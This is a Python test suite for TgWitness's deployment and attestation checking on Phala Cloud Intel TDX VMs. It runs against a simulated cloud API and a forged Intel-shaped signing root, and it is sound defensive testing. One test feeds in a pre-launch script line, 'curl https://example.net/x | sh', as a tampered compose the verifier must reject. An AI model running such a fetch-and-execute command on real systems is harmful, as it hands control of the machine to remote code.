"""Phala deployments against a simulated Phala Cloud API and a simulated confidential VM.

The CVM's quotes are signed by a forged PKI shaped like Intel's (tools/check_tdx.py) and checked by the
real tgwitness.tdx code with that forged root in place of Intel's: deploy, verify and the journal, and
every substitution a quote has to expose.
"""
import hashlib
import io
import json
import re
import tarfile
import time
from datetime import datetime, timezone
from types import SimpleNamespace as NS
from urllib.parse import parse_qs, urlsplit

import minicheck as pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from cloud_world import COMMIT, CREATED, LATE, ROOT, TUNNEL, Response, World, arguments, checks, detail
from check_tdx import SEPT_VE_DISABLE, Forge, launch_log, rtmr3, runtime_event
from tgwitness import assurance, cloud, tdx
from tgwitness.evidence import export_file
from tgwitness.provenance import source_files, source_tree_sha256
from tgwitness.providers import base, get
from tgwitness.providers.phala import API_VERSION, Phala
from tgwitness.security import Vault
from tgwitness.store import Store
from tgwitness.verify import fingerprint

INSTANCE = "07" * 20
OS_IMAGE = "ab" * 32


def archive_of(files, commit=COMMIT):
    data = io.BytesIO()
    with tarfile.open(fileobj=data, mode="w:gz") as archive:
        for path, body in files.items():
            item = tarfile.TarInfo("TgWitness-" + commit + "/" + path)
            item.size = len(body)
            archive.addfile(item, io.BytesIO(body))
    return data.getvalue()


SOURCE = cloud.tree_files(ROOT)
ARCHIVE = archive_of({**SOURCE, "website/index.html": b"not installed"})


class PhalaWorld(World):
    """Cloudflare plus Phala Cloud's API: provision, commit, the CVM and the application's revisions."""
    key, server_type, ipv4 = "phala", "tdx.small", "198.51.100.7"

    def __init__(self):
        super().__init__()
        self.kms, self.cvm, self.revisions, self.env, self.app_compose = X25519PrivateKey.generate(), None, [], None, None

    def provider(self, method, url, body, params, headers, data):
        assert headers["X-API-Key"] and headers["X-Phala-Version"] == API_VERSION and "Authorization" not in headers
        path = url[len(Phala.base):]
        if path == "/cvms" and method == "POST" and "compose_file" in body:
            self.name, self.provisioned = body["name"], body
            # Phala normalises the compose its own way; the verifier never rebuilds this text.
            self.app_compose = json.dumps({"manifest_version": 2, "name": body["name"], "runner": "docker-compose",
                                           **body["compose_file"]}, sort_keys=True)
            self.compose_hash = hashlib.sha256(self.app_compose.encode()).hexdigest()
            self.app_id = self.compose_hash[:40]
            public = self.kms.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
            return Response(200, {"app_id": self.app_id, "app_env_encrypt_pubkey": public.hex(),
                                  "compose_hash": self.compose_hash, "token": "commit-token"})
        if path == "/cvms" and method == "POST":
            assert body["token"] == "commit-token" and body["app_id"] == self.app_id
            sealed = bytes.fromhex(body["encrypted_env"])
            shared = self.kms.exchange(X25519PublicKey.from_public_bytes(sealed[:32]))
            self.env = {e["key"]: e["value"] for e in json.loads(AESGCM(shared).decrypt(sealed[32:44], sealed[44:], None))["env"]}
            assert sorted(self.env) == body["env_keys"]
            self.cvm = {"id": "cvm-1", "name": self.name, "app_id": self.app_id, "instance_id": INSTANCE,
                        "status": "running", "compose_hash": self.compose_hash, "resource": {"instance_type": "tdx.small"},
                        "os": {"version": "0.5.5", "is_dev": False, "os_image_hash": OS_IMAGE},
                        "node_info": {"name": "node-1", "region": "us-west"}, "gateway_enabled": False, "endpoints": []}
            self.revise("provision", self.compose_hash)
            return Response(200, {"id": "cvm-1", "created_at": CREATED, "app_id": self.app_id})
        if path == "/cvms/cvm-1" and method == "DELETE":
            self.deleted = True
            return Response(204)
        if path == "/cvms/cvm-1":
            return Response(404, {"detail": "not found"}) if self.deleted else Response(200, self.cvm)
        if path == "/cvms/paginated":
            items = [] if self.deleted or not self.cvm else [self.cvm]
            return Response(200, {"items": items, "total": len(items), "page": params["page"], "page_size": 100,
                                  "pages": 1})
        if path == "/instance-types":
            return Response(200, {"result": [
                {"name": "cpu", "total": 3, "items": [
                    {"id": "tdx.medium", "name": "TDX Medium", "vcpu": 4, "memory_mb": 8192, "hourly_rate": "0.116",
                     "requires_gpu": False, "default_disk_size_gb": 40, "family": "cpu"},
                    {"id": "tdx.small", "name": "TDX Small", "vcpu": 1, "memory_mb": 2048, "hourly_rate": "0.058",
                     "requires_gpu": False, "default_disk_size_gb": 20, "family": "cpu"},
                    {"id": "tdx.tiny", "name": "TDX Tiny", "vcpu": 1, "memory_mb": 1024, "hourly_rate": "0.02",
                     "requires_gpu": False, "default_disk_size_gb": 20, "family": "cpu"}]},
                {"name": "gpu", "total": 1, "items": [
                    {"id": "h200.small", "name": "H200", "vcpu": 24, "memory_mb": 196608, "hourly_rate": "0.01",
                     "requires_gpu": True, "default_disk_size_gb": 100, "family": "gpu"}]}]})
        if path == "/apps/" + self.app_id + "/revisions":
            return Response(200, {"revisions": self.revisions, "total": len(self.revisions), "page": params["page"],
                                  "page_size": 100, "total_pages": 1})
        raise AssertionError(method + " " + path)

    def revise(self, operation, compose_hash, when=CREATED):
        self.revisions.append({"revision_id": "r" + str(len(self.revisions) + 1), "app_id": self.app_id,
                               "vm_uuid": "vm-1", "compose_hash": compose_hash, "created_at": when,
                               "operation_type": operation, "triggered_by": {"username": "operator"}})


    def request(self, method, url, timeout=None, json=None, params=None, headers=None, data=None):
        if url.startswith("https://api.github.com/repos/phishdestroy/TgWitness/commits/"):
            return Response(200, {"sha": COMMIT})  # the wizard's version lookup
        return super().request(method, url, timeout, json, params, headers, data)

    def get(self, url, timeout=None, **options):
        """GitHub: the commit archive the CVM installs from."""
        assert url == "https://codeload.github.com/phishdestroy/TgWitness/tar.gz/" + COMMIT, url
        return Response(200, content=ARCHIVE)


class Cvm:
    """The collector in the CVM: a real vault signing real statements, quoted by the forged platform."""
    def __init__(self, world, tmp_path, forge):
        self.world, self.forge, self.vault, self.root = world, forge, Vault(tmp_path / "collector"), tmp_path / "cvm"
        for directory in ("proc/net", "proc/sys/kernel/random", "etc/tgwitness"):
            (self.root / directory).mkdir(parents=True, exist_ok=True)
        (self.root / "proc/sys/kernel/random/boot_id").write_text("boot-1\n")
        (self.root / "proc/net/tcp").write_text("  sl  local_address rem_address   st\n")
        self.receipt = {"run_id": "run-1", "version": "0.7.0", "source_tree_sha256": source_tree_sha256(source_files()),
                        "public_key": self.vault.public_key}
        self.override, self.attributes, self.late, self.bind_to = {}, SEPT_VE_DISABLE, [], None
        self.compose_hash = None  # what dstack measured, if not the world's app-compose

    def provider(self):
        return {"provider": "phala", "instance_id": INSTANCE, "app_id": self.world.app_id, "hostname": "cvm",
                "public_ipv4": None, "region": None, "compose_hash": self.world.compose_hash,
                "app_compose": self.world.app_compose, "os_image_hash": OS_IMAGE, **self.override}

    def attest(self, data):
        measured = bytes.fromhex(self.compose_hash or self.world.compose_hash)
        log = launch_log(measured, app_id=bytes.fromhex(self.world.app_id), instance_id=bytes.fromhex(INSTANCE),
                         extra=self.late)
        quote = self.forge.quote(self.bind_to or data, rtmr3(log), attributes=self.attributes)
        return {"quote": quote.hex(), "event_log": json.dumps(log),
                "vm_config": json.dumps({"os_image_hash": OS_IMAGE, "cpu_count": 2, "memory_size": 2 ** 31})}

    def get(self, url, timeout):
        compose = json.loads(self.world.app_compose)["docker_compose_file"]
        text = re.search(r"DESCRIPTION = json\.loads\((\".*\")\)", compose).group(1)
        (self.root / "etc/tgwitness/assurance.json").write_text(
            json.dumps(json.loads(json.loads(text)), sort_keys=True) + "\n")
        challenge = parse_qs(urlsplit(url).query).get("challenge", [None])[0]
        return Response(200, assurance.statement(self.vault, self.receipt, 1, "phala", self.provider(), challenge,
                                                 self.root))

    def fetch(self, host, challenge):
        return cloud.collector_statement(host, challenge, session=self)


def build_here(command, input, **options):
    spec, tunnel = json.loads(input)
    return NS(returncode=0, stdout=cloud.phala_compose(spec, tunnel, cloud.source_manifest(SOURCE)).encode(), stderr=b"")


@pytest.fixture
def phala(tmp_path, monkeypatch):
    monkeypatch.setattr(base, "pause", lambda seconds: None)
    forge = Forge(datetime.now(timezone.utc))
    monkeypatch.setattr(tdx, "intel_root", lambda: forge.root)
    original = cloud.reference_installer
    monkeypatch.setattr(cloud, "reference_installer", lambda record, source: original(record, source, run=build_here))
    world = PhalaWorld()
    cvm = Cvm(world, tmp_path, forge)
    monkeypatch.setattr(Phala, "attest", staticmethod(cvm.attest))
    collateral = tmp_path / "collateral.json"
    collateral.write_text(json.dumps(forge.collateral()))
    measurements = tmp_path / "measurements.json"
    measurements.write_text(json.dumps({k: v.hex() for k, v in Forge.measurements().items()}))
    args = arguments(tmp_path, "phala", server_type="tdx.small", repository="https://github.com/phishdestroy/TgWitness")
    record, out = cloud.deploy(args, get("phala")("phala-key", session=world), cloud.Cloudflare("cf-write", world),
                               cvm.fetch, resolve=lambda repository, ref: ref, archive=lambda spec: ARCHIVE,
                               collateral=lambda raw: json.loads(collateral.read_text()))
    return NS(world=world, cvm=cvm, forge=forge, record=record, out=out, collateral=collateral,
              measurements=measurements, tmp=tmp_path)


@pytest.fixture
def journal(tmp_path, monkeypatch):
    monkeypatch.delenv("TGWITNESS_TOKEN", raising=False)
    vault = Vault(tmp_path)
    store = Store(tmp_path)
    store.bind(vault)
    yield store, vault
    store.close()


def verify(case, **changes):
    values = dict(record=case.out / "deployment.json", provider_token_file=None, cloudflare_token_file=None,
                  fingerprint=fingerprint(case.cvm.vault.public_key), cloud_init=case.out / "docker-compose.yaml",
                  source=ROOT, evidence=None, tdx_measurements=case.measurements, tdx_collateral=case.collateral)
    values.update(changes)
    return cloud.verify(NS(**values), get("phala")("read-only", session=case.world),
                        cloud.Cloudflare("cf-read", case.world), case.cvm.fetch)


def test_the_compose_pins_the_commit_its_files_and_both_images(tmp_path):
    spec = cloud.specification(arguments(tmp_path, "phala", server_type="tdx.small",
                                         repository="https://github.com/phishdestroy/TgWitness.git"),
                               resolve=lambda repository, ref: ref)
    manifest = cloud.source_manifest(cloud.tarball_files(ARCHIVE))
    assert manifest == cloud.source_manifest(SOURCE)  # the archive's other files are not installed
    compose = cloud.phala_compose(spec, TUNNEL, manifest)
    assert "https://codeload.github.com/phishdestroy/TgWitness/tar.gz/" + COMMIT in compose
    assert 'MANIFEST = "' + manifest + '"' in compose and compose.count("@sha256:") == 2
    assert "${TGWITNESS_TOKEN}" in compose and "${TGWITNESS_TUNNEL_TOKEN}" in compose and compose.isascii()
    installer = compose.split("      - |\n", 1)[1].split("\n  tunnel:", 1)[0]
    source = "\n".join(line[8:] for line in installer.splitlines())
    compile(source, "installer", "exec")
    assert "$" not in source and "--require-hashes" in source
    # The installer's own hashing gives the manifest deploy computed.
    digests = {path: hashlib.sha256(body).hexdigest() for path, body in SOURCE.items() if cloud.wanted_source(path)}
    assert hashlib.sha256(json.dumps(digests, ensure_ascii=False, sort_keys=True,
                                     separators=(",", ":")).encode()).hexdigest() == manifest
    for changes, message in (({"repository": "https://gitlab.com/x/y"}, "GitHub repository"),
                             ({"debug_ssh_key": "ops", "debug_ssh_from": "198.51.100.4"}, "no SSH")):
        with pytest.raises(cloud.DeployError, match=message):
            cloud.specification(arguments(tmp_path, "phala", server_type="tdx.small", **{
                "repository": "https://github.com/phishdestroy/TgWitness", **changes}), resolve=lambda repository, ref: ref)


def test_deploy_creates_a_cvm_whose_secrets_never_leave_encrypted(phala):
    world, record, out = phala.world, phala.record, phala.out
    assert record["state"] == "running" and record["mode"] == "high-assurance" and record["server"]["app_id"] == world.app_id
    assert record["collector"]["fingerprint"] == fingerprint(phala.cvm.vault.public_key)
    assert all(c["status"] in ("pass", "unavailable") for c in record["collector"]["attestation"])
    assert world.provisioned["compose_file"]["allowed_envs"] == list(cloud.PHALA_ENV)
    assert world.provisioned["compose_file"]["gateway_enabled"] is False and world.provisioned["listed"] is False
    panel_token = (out / "panel-token.txt").read_text()
    assert world.env == {"TGWITNESS_TOKEN": panel_token, "TGWITNESS_TUNNEL_TOKEN": world.tunnel["token"]}
    published = (out / "docker-compose.yaml").read_text()
    assert json.loads(world.app_compose)["docker_compose_file"] == published
    saved = (out / "deployment.json").read_text() + published
    for secret in (panel_token, world.tunnel["token"], "phala-key", "cf-write"):
        assert secret not in saved
    with pytest.raises(cloud.DeployError, match="no SSH and no provider firewall"):
        cloud.lock(NS(record=out / "deployment.json", provider_token_file=None),
                   get("phala")("phala-key", session=world))


def test_a_clean_deployment_passes_on_the_quote_alone(phala):
    report = verify(phala)
    assert report["result"] == "pass", [c for c in report["checks"] if c["status"] != "pass"]
    assert report["verification_scope"] == "hardware-attestation"
    assert report["assurance"] == {"runtime_measurements": "intel-tdx-quote", "independent_runtime_attestation": "intel-tdx",
                                   "key_nonexportability": "established-by-measured-code",
                                   "source_authenticity": "commit-pinned-in-measured-compose"}
    found = checks(report)
    assert {"tdx_binding", "tdx_quote", "tdx_compose_hash", "tdx_compose", "tdx_identity", "tdx_os"} <= found.keys()
    assert "binding" not in found and "cloud_init" not in found and "host_access" not in found
    markdown = cloud.render(report)
    assert "checked by this verifier to Intel's root" in markdown and "--tdx-measurements" in markdown
    assert "Without hardware attestation" not in markdown and "Phala's KMS" in markdown
    assert phala.world.tunnel["token"] not in markdown + json.dumps(report)
    # Without measurements from the image the firmware and kernel are not compared: incomplete, not passed.
    report = verify(phala, tdx_measurements=None)
    assert report["result"] == "incomplete" and checks(report)["tdx_os"] == "unavailable"
    assert report["assurance"]["key_nonexportability"] == "conditional-on-os-image"
    wrong = phala.tmp / "other-image.json"
    wrong.write_text(json.dumps({**{k: v.hex() for k, v in Forge.measurements().items()}, "rtmr2": "00" * 48}))
    assert checks(verify(phala, tdx_measurements=wrong))["tdx_os"] == "fail"


def test_every_substitution_the_quote_must_expose(phala):
    cvm, world = phala.cvm, phala.world
    cvm.bind_to = b"another statement"
    assert checks(verify(phala))["tdx_binding"] == "fail"
    cvm.bind_to = None
    cvm.attributes = SEPT_VE_DISABLE | 1  # a TD the host can read
    result = verify(phala)
    assert checks(result)["tdx_quote"] == "fail" and "debug mode" in detail(result, "tdx_quote")
    cvm.attributes = SEPT_VE_DISABLE
    # The collector reports one compose while dstack measured another.
    cvm.compose_hash = "11" * 32
    result = checks(verify(phala))
    assert result["tdx_compose_hash"] == "fail" and result["tdx_compose"] == "fail"
    cvm.compose_hash = None
    # A measured compose that runs a pre-launch script, and one whose collector is not the commit's.
    for change in ({"pre_launch_script": "curl https://example.net/x | sh"},
                   {"docker_compose_file": json.loads(world.app_compose)["docker_compose_file"].replace(
                       "--require-hashes", "--no-deps", 1)}):
        world.app_compose = json.dumps({**json.loads(world.app_compose), **change}, sort_keys=True)
        world.compose_hash = hashlib.sha256(world.app_compose.encode()).hexdigest()
        cvm.compose_hash = None
        report = verify(phala)
        assert checks(report)["tdx_compose"] == "fail", detail(report, "tdx_compose")
        assert report["assurance"]["independent_runtime_attestation"] == "failed"


def test_events_after_boot_another_instance_and_revisions_are_reported(phala):
    cvm, world = phala.cvm, phala.world
    cvm.late = [runtime_event("app-extended", b"x")]
    assert checks(verify(phala))["tdx_compose_hash"] == "review"
    cvm.late = []
    cvm.override = {"instance_id": "08" * 20}
    assert checks(verify(phala))["tdx_identity"] == "fail"
    cvm.override = {}
    world.revise("restart", world.compose_hash, LATE)
    assert checks(verify(phala))["provider_actions"] == "review"
    world.revise("update", "22" * 32, LATE)
    report = verify(phala)
    assert checks(report)["provider_actions"] == "fail" and report["result"] == "fail"
    world.cvm["os"]["is_dev"] = True
    assert checks(verify(phala))["server_state"] == "fail"
    world.deleted = True
    assert checks(verify(phala))["server"] == "fail"


def test_the_journal_carries_a_quote_for_every_start(phala, journal):
    store, vault = journal
    cvm = phala.cvm
    record = json.loads((phala.out / "deployment.json").read_text())

    def start(**changes):
        run = {"run_id": "run-" + str(len(changes)), "public_key": vault.public_key,
               "source_tree_sha256": "s" * 64, "host": {"provider": cvm.provider(), "boot_id": "boot-1"}, **changes}
        run["tdx_start"] = assurance.start_attestation("phala", run)
        store.append("process.started", {"run": run})

    def run():
        report = cloud.Report()
        cloud.verify_tdx_journal(report, export_file(store, vault, "zip"), fingerprint(vault.public_key), record,
                                 cloud.reference_installer(record, ROOT), lambda raw: phala.forge.collateral())
        return {c["check"]: c for c in report.checks}
    start()
    store.append("account.authorized", {"account_id": 44, "key_origin": "created"})
    found = run()
    assert found["journal"]["status"] == "pass", found["journal"]["detail"]
    assert "each quoted inside CVM " + INSTANCE in found["journal"]["detail"] and found["account_key"]["status"] == "pass"
    store.append("process.started", {"run": {"run_id": "plain", "public_key": vault.public_key, "host": {}}})
    assert "without an Intel TDX quote" in run()["journal"]["detail"]


def test_the_journal_refuses_a_start_in_another_compose_or_outside_the_quote(phala, journal):
    store, vault = journal
    cvm = phala.cvm
    record = json.loads((phala.out / "deployment.json").read_text())
    run = {"run_id": "r1", "public_key": vault.public_key, "source_tree_sha256": "s" * 64,
           "host": {"provider": cvm.provider()}}
    run["tdx_start"] = assurance.start_attestation("phala", run)
    run["host"] = {"provider": {**cvm.provider(), "instance_id": "09" * 20}}  # edited after it was quoted
    store.append("process.started", {"run": run})
    report = cloud.Report()
    cloud.verify_tdx_journal(report, export_file(store, vault, "zip"), fingerprint(vault.public_key), record,
                             None, lambda raw: phala.forge.collateral())
    assert report.checks[-1]["status"] == "fail" and "does not cover this start" in report.checks[-1]["detail"]


def test_the_reference_compose_is_built_by_the_checkouts_own_code(tmp_path, monkeypatch):
    monkeypatch.setattr(cloud, "REFERENCES", {})
    spec = cloud.specification(arguments(tmp_path, "phala", server_type="tdx.small",
                                         repository="https://github.com/phishdestroy/TgWitness"),
                               resolve=lambda repository, ref: ref)
    record = {**spec, "tunnel": {"id": TUNNEL}}
    assert cloud.reference_installer(record, ROOT) == cloud.phala_compose(spec, TUNNEL, cloud.source_manifest(SOURCE))


def test_the_dstack_guest_agent_is_asked_over_its_socket(monkeypatch):
    asked = []

    def guest(method, body=None, path=None, timeout=10):
        asked.append((method, body))
        if method == "Info":
            return {"app_id": "aa" * 20, "instance_id": INSTANCE, "compose_hash": "cc" * 32, "key_provider_info": "{}",
                    "tcb_info": json.dumps({"app_compose": '{"runner":"docker-compose"}', "os_image_hash": OS_IMAGE})}
        return {"quote": "00", "event_log": "[]", "vm_config": "{}"}
    monkeypatch.setattr("tgwitness.providers.phala.guest", guest)
    found = assurance.provider_record("phala")
    assert found["app_compose"] == '{"runner":"docker-compose"}' and found["instance_id"] == INSTANCE
    assert found["os_image_hash"] == OS_IMAGE and "error" not in found
    assert Phala.attest(b"\1" * 64)["quote"] == "00" and asked[-1] == ("GetQuote", {"report_data": "01" * 64})
    with pytest.raises(ValueError):
        Phala.attest(b"short")


def test_cli_plan_prints_the_measured_compose(capsys, monkeypatch):
    monkeypatch.setattr(cloud, "fetch_archive", lambda spec, session=None: ARCHIVE)
    cloud.main(["plan", "--provider", "phala", "--name", "case-1", "--ref", COMMIT, "--zone", "example.org",
                "--cloudflare-account", "0" * 32, "--panel-host", "case1.example.org", "--server-type", "tdx.small",
                "--repository", "https://github.com/phishdestroy/TgWitness"])
    output = capsys.readouterr().out
    assert "Phala Cloud (Intel TDX): CVM tdx.small" in output and "@sha256:" in output and output.isascii()
    assert "TGWITNESS_TOKEN, TGWITNESS_TUNNEL_TOKEN encrypted" in output


def quick(tmp_path, **changes):
    return arguments(tmp_path, "phala", server_type="tdx.small", repository="https://github.com/phishdestroy/TgWitness",
                     zone=None, cloudflare_account=None, panel_host=None, witness_host=None, quick_tunnel=True,
                     **changes)


def test_a_quick_tunnel_runs_in_the_measured_compose_and_posts_its_address_signed(phala, tmp_path, monkeypatch):
    spec = cloud.specification(quick(tmp_path), resolve=lambda repository, ref: ref)
    compose = cloud.phala_compose(spec, None, cloud.source_manifest(SOURCE))
    assert "--url, http://127.0.0.1:8787" in compose and " TUNNEL_TOKEN:" not in compose
    assert 'TGWITNESS_BEACON: "' + spec["beacon"] + '"' in compose and cloud.ADDRESS_FORMAT in compose
    assert re.findall(r"\$\{?(\w+)", compose) == ["TGWITNESS_TOKEN", "TGWITNESS_TUNNEL_TOKEN"]
    assert '\\"beacon\\": \\"' + spec["beacon"] in compose  # in the measured description as well
    world = PhalaWorld()
    cvm = Cvm(world, tmp_path / "quick", phala.forge)
    monkeypatch.setattr(Phala, "attest", staticmethod(cvm.attest))
    posted = {"host": "calm-words-here.trycloudflare.com", "posted": 1, "signed": True}
    out = tmp_path / "quick-deployment"
    record, out = cloud.deploy(quick(tmp_path, out=out), get("phala")("phala-key", session=world), None,
                               cvm.fetch, resolve=lambda repository, ref: ref, beacon=lambda topic, key=None: posted,
                               archive=lambda spec: ARCHIVE, collateral=lambda raw: json.loads(phala.collateral.read_text()),
                               progress=lambda stage, text: None)
    assert record["state"] == "running" and record["address"]["host"] == posted["host"] and "tunnel" not in record
    key = (out / "address-key.txt").read_text()
    assert world.env == {"TGWITNESS_TOKEN": (out / "panel-token.txt").read_text(), "TGWITNESS_TUNNEL_TOKEN": key}
    assert not [c for c in world.calls if c[1].startswith(cloud.CLOUDFLARE_API)]
    report = cloud.verify(NS(record=out / "deployment.json", provider_token_file=None, cloudflare_token_file=None,
                             fingerprint=fingerprint(cvm.vault.public_key), cloud_init=out / "docker-compose.yaml",
                             source=ROOT, evidence=None, tdx_measurements=phala.measurements,
                             tdx_collateral=phala.collateral),
                          get("phala")("read-only", session=world), None, cvm.fetch,
                          beacon=lambda topic, key=None: posted)
    found = checks(report)
    assert all(found[c] == "pass" for c in ("tdx_binding", "tdx_quote", "tdx_compose_hash", "tdx_compose",
                                             "tdx_identity")), found
    assert report["assurance"]["independent_runtime_attestation"] == "intel-tdx"
    assert cloud.PHALA_QUICK in report["does_not_establish"]
    assert not any("Cloudflare reports the tunnel" in text for text in report["establishes"])
    record, removed = cloud.destroy(NS(record=out / "deployment.json", confirm="case-1", provider_token_file=None,
                                       cloudflare_token_file=None), get("phala")("phala-key", session=world), None,
                                    lambda stage, text: None)
    assert world.deleted and removed == [{"resource": "cvm", "id": "cvm-1", "name": "tgwitness-case-1-"
                                          + record["deployment_id"]}] and record["state"] == "removed"


def test_destroy_finds_the_cvm_of_a_deployment_that_failed_before_recording_it(phala):
    record = json.loads((phala.out / "deployment.json").read_text())
    name = "tgwitness-" + record["name"] + "-" + record["deployment_id"]
    removed = get("phala")("phala-key", session=phala.world).destroy({**record, "server": None})
    assert removed == [{"resource": "cvm", "id": "cvm-1", "name": name}] and phala.world.deleted
    assert get("phala")("phala-key", session=phala.world).destroy({**record, "server": None}) == []


def test_the_panel_wizard_prices_deploys_and_deletes_a_phala_cvm(phala, tmp_path, monkeypatch):
    from tgwitness import cloud_wizard
    key = "phak_" + "k" * 32
    with pytest.raises(ValueError, match="phak_"):
        cloud_wizard.Check(provider="phala", phala_token="")
    with pytest.raises(ValueError, match="phak_"):
        cloud_wizard.Check(provider="phala", phala_token="not-a-key")
    with pytest.raises(cloud_wizard.WizardError, match="Gateway DNS"):
        cloud_wizard.check(cloud_wizard.Check(provider="phala", phala_token=key, gateway=True), phala.world)
    monkeypatch.setattr(cloud_wizard, "version", lambda ref=None, session=None: {"ref": "v0.7.1", "commit": COMMIT})
    offer = cloud_wizard.check(cloud_wizard.Check(provider="phala", phala_token=key), phala.world)
    assert offer["provider"] == "phala" and offer["currency"] == "USD" and offer["location"]["name"] == "any"
    assert offer["server"] == {"name": "tdx.small", "cores": 1, "memory": 2.0, "disk": 20, "monthly": "42.34",
                               "hourly": "0.058"}, offer["server"]
    world = PhalaWorld()
    cvm = Cvm(world, tmp_path / "wizard", phala.forge)
    monkeypatch.setattr(Phala, "attest", staticmethod(cvm.attest))
    posted = {"host": "calm-words-here.trycloudflare.com", "posted": 1, "signed": True}
    jobs = cloud_wizard.Jobs(tmp_path / "panel", session=world, fetch=cvm.fetch,
                             beacon=lambda topic, key=None: posted,
                             collateral=lambda raw: json.loads(phala.collateral.read_text()))
    jobs.deploy(cloud_wizard.Deploy(provider="phala", phala_token=key, location="any", server_type="tdx.small",
                                    name="cvm-1"))
    for attempt in range(600):
        job = jobs.status()["job"]
        if job["state"] != "running":
            break
        time.sleep(.05)
    assert job["state"] == "done", job
    assert job["result"]["provider"] == "phala" and job["result"]["panel"] == "https://" + posted["host"]
    assert any(line["text"].startswith("[PASS] Intel vouches for the quote") for line in job["lines"]), job["lines"]
    listed = jobs.status()["deployments"]
    assert listed[0]["attested"] is True and listed[0]["provider"] == "phala"
    path, media = jobs.file("cvm-1", "docker-compose.yaml")
    assert path.read_text() == json.loads(world.app_compose)["docker_compose_file"]
    for secret in (key, (tmp_path / "panel/deployments/cvm-1/panel-token.txt").read_text()):
        assert secret not in (tmp_path / "panel/deployments/cvm-1/deployment.json").read_text()
    with pytest.raises(cloud_wizard.WizardError, match="Phala Cloud API key"):
        jobs.destroy(cloud_wizard.Destroy(hetzner_token="h" * 64, name="cvm-1", confirm="cvm-1"))
    jobs.destroy(cloud_wizard.Destroy(provider="phala", phala_token=key, name="cvm-1", confirm="cvm-1"))
    for attempt in range(600):
        job = jobs.status()["job"]
        if job["state"] != "running":
            break
        time.sleep(.05)
    assert job["state"] == "done" and world.deleted, job
    problem = cloud_wizard.explain(cloud.DeployError("Phala Cloud: HTTP 401 Unauthorized"))
    assert "API key" in str(problem) and "401" in problem.technical


def test_the_wizard_in_the_browser_offers_deploys_and_deletes_a_phala_cvm(phala, tmp_path, monkeypatch):
    """The panel: choosing Phala Cloud swaps the token and hides Hetzner's region and Gateway DNS; English and Russian."""
    from check_browser import RunningApp, check_layout, launch_browser, navigate_panel, reload_panel, unlock
    from playwright.sync_api import expect, sync_playwright
    from tgwitness import i18n
    output = ROOT / "test-results" / "phala"
    output.mkdir(parents=True, exist_ok=True)
    world = PhalaWorld()
    cvm = Cvm(world, tmp_path / "browser", phala.forge)
    monkeypatch.setattr(Phala, "attest", staticmethod(cvm.attest))
    posted = {"host": "calm-words-here.trycloudflare.com", "posted": 1, "signed": True}
    key, errors = "phak_" + "k" * 32, []
    with RunningApp(tmp_path / "panel") as server, sync_playwright() as p:
        jobs = server.app.state.cloud_jobs
        jobs.session, jobs.fetch, jobs.beacon = world, cvm.fetch, lambda topic, key=None: posted
        jobs.collateral = lambda raw: json.loads(phala.collateral.read_text())
        browser = launch_browser(p)
        context = browser.new_context(viewport={"width": 1280, "height": 1000}, reduced_motion="reduce")
        page = context.new_page()
        page.on("pageerror", lambda exc: errors.append(str(exc)))
        unlock(page, server)
        navigate_panel(page, "witness")
        page.locator("#extras-open-cloud").click()
        expect(page.locator("#cloud-hetzner-token")).to_be_visible()
        page.locator('input[name="cloud-host"][value="phala"]').check()
        for hidden in ("#cloud-hetzner-token", "#cloud-gateway", 'input[name="cloud-region"][value="eu"]'):
            expect(page.locator(hidden)).to_be_hidden()
        page.locator("#cloud-phala-token").fill(key)
        page.locator("#cloud-check").click()
        expect(page.locator("#cloud-offer")).to_be_visible()
        expect(page.locator("#cloud-summary")).to_contain_text("tdx.small")
        expect(page.locator("#cloud-summary")).to_contain_text("billed by Phala Cloud")
        expect(page.locator("#cloud-access")).to_contain_text("Intel TDX confidential virtual machine")
        for width in (390, 1440):
            page.set_viewport_size({"width": width, "height": 1000})
            check_layout(page)
        page.set_viewport_size({"width": 1280, "height": 1000})
        page.locator("#cloud-wizard").screenshot(path=str(output / "wizard-phala-offer.png"))
        page.locator("#cloud-consent").check()
        page.locator("#cloud-create").click()
        expect(page.locator("#cloud-job-title")).to_have_text("The server is ready", timeout=30000)
        expect(page.locator("#cloud-stages")).to_contain_text("Phala Cloud confidential virtual machine")
        expect(page.locator("#cloud-outcome")).to_contain_text("Intel's attestation matched this deployment")
        expect(page.locator("#cloud-outcome")).to_contain_text(posted["host"])
        name = jobs.status()["deployments"][0]["name"]
        page.locator("#cloud-servers").evaluate("details => details.open = true")
        row = page.locator(".cloud-server", has_text=name)
        expect(row).to_contain_text("Intel TDX confidential virtual machine at Phala Cloud")
        page.once("dialog", lambda dialog: dialog.accept(name))
        row.get_by_role("button", name="Delete the server").click()
        expect(page.locator("#cloud-job-title")).to_have_text("The server is deleted", timeout=30000)
        expect(page.locator("#cloud-outcome")).to_contain_text("Phala Cloud stops billing")
        assert world.deleted
        context.add_cookies([{"name": i18n.COOKIE, "value": "ru", "url": server.url}])
        reload_panel(page)
        expect(page.locator("#view-witness")).to_be_visible()
        navigate_panel(page, "witness")
        page.locator("#extras-open-cloud").click()
        words = i18n.words("ru")
        page.locator('input[name="cloud-host"][value="phala"]').check()
        expect(page.locator("#cloud-phala-token")).to_be_visible()
        expect(page.locator('h3[data-cloud-host="phala"]')).to_have_text(words["Connect Phala Cloud"])
        expect(page.locator(".cloud-hosts label").nth(1).locator("strong")).to_have_text(
            words["Confidential virtual machine · Phala Cloud"])
        page.locator("#cloud-wizard").screenshot(path=str(output / "wizard-phala-ru.png"))
        browser.close()
    assert not errors, errors


if __name__ == "__main__":
    raise SystemExit(pytest.run(globals()))
